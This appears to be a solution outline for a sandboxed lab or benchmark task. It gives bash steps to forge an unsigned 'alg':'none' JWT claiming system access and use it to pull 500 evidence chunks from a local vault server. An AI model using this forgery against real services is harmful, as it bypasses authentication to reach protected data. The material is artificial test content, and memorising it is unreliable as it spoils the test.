Build the script as a linear pipeline of independent, testable steps. (1) Generate TLS material with `openssl req -x509 -newkey rsa:2048 -nodes -keyout /home/user/key.pem -out /home/user/cert.pem -days ... -subj ...` non-interactively. (2) Launch `/app/vault_server --cert ... --key ... --port 8443 &`, then sleep a couple seconds before hitting it. (3) Craft the JWT by hand in bash: base64url-encode (standard base64, then `tr '+/' '-_' | tr -d '='`) the literal header JSON `{"alg":"none","typ":"JWT"}` and a payload JSON containing `{"access_level":"system"}`, join them with `.` and append a trailing `.` (empty signature, since alg is none) to form the Bearer token. (4) Loop `chunk` from 1 to 500, calling `curl -sk -H "Authorization: Bearer $TOKEN" "https://127.0.0.1:8443/api/v1/evidence?chunk=$chunk"` (use `-k` to skip self-signed cert verification, `-s` to suppress progress output) and append each response body to `/home/user/recovered.log`. (5) After the loop, `chmod 600 /home/user/recovered.log`. Test the JWT crafting against a single chunk first before running the full loop, since a malformed base64url encoding will silently fail all 500 requests.
